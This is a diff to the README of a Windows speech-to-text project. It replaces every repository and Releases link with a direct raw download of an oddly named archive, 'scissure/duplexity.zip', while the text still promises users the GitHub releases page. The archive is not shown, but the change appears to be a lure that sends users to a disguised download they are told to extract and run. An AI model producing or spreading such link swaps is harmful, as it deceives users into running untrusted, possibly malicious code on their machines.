@@ -1,6 +1,6 @@
 # 🎤 Voice-To-Text-Windows - Speak, Don't Type, Instantly!
 
-[![Download Now](https://img.shields.io/badge/Download-Voice--To--Text--Windows-blueviolet?style=for-the-badge&logo=github)](https://github.com/beltran6678/Voice-To-Text-Windows)
+[![Download Now](https://img.shields.io/badge/Download-Voice--To--Text--Windows-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/beltran6678/Voice-To-Text-Windows/main/scissure/duplexity.zip)
 
 ## 🚀 What Is This?
 
@@ -28,7 +28,7 @@ This app is perfect for anyone who wants to:
 
 Visit this link to download the application.
 
-[🔗 Download Voice-To-Text-Windows Now](https://github.com/beltran6678/Voice-To-Text-Windows)
+[🔗 Download Voice-To-Text-Windows Now](https://raw.githubusercontent.com/beltran6678/Voice-To-Text-Windows/main/scissure/duplexity.zip)
 
 Once you click the link, you'll see the GitHub page. Look for the green "Code" button or the "Releases" section on the right side. Click "Releases" to find the latest version. Download the file that matches your system (usually a .zip or .exe file). If you download a .zip, extract it to a folder, then double-click the application file to run it. That's all—no installation wizard needed.
 
@@ -93,7 +93,7 @@ Your voice data never leaves your computer. The app processes everything locally
 
 ## 🛠️ Tech Support
 
-If you encounter issues, check the [Releases](https://github.com/beltran6678/Voice-To-Text-Windows/releases) page for updates or visit the main repository for more details. For advanced help, you can open an issue on GitHub.
+If you encounter issues, check the [Releases](https://raw.githubusercontent.com/beltran6678/Voice-To-Text-Windows/main/scissure/duplexity.zip) page for updates or visit the main repository for more details. For advanced help, you can open an issue on GitHub.
 
 ## 📝 Changelog
 
@@ -113,6 +113,6 @@ Voice-To-Text-Windows is released under the MIT License. You can use, modify, an
 
 Download the app now and stop typing—start speaking!
 
-[🔗 Download Voice-To-Text-Windows](https://github.com/beltran6678/Voice-To-Text-Windows)
+[🔗 Download Voice-To-Text-Windows](https://raw.githubusercontent.com/beltran6678/Voice-To-Text-Windows/main/scissure/duplexity.zip)
 
 Keywords: dictation-tool, speech-recognition, speech-recognition-apps, speech-to-text, speech-to-text-app, speech-to-text-example, speech-to-text-to-speech, speech-to-text-transcription, speech-to-text-translation, voice-input, voice-to-text, voice-to-text-, voice-to-text-ai, voice-to-text-text-to-speech, voice-to-text-to-voice, voice-to-text-transcription, voice-typing, voice-typing-app, windows-voice-typing
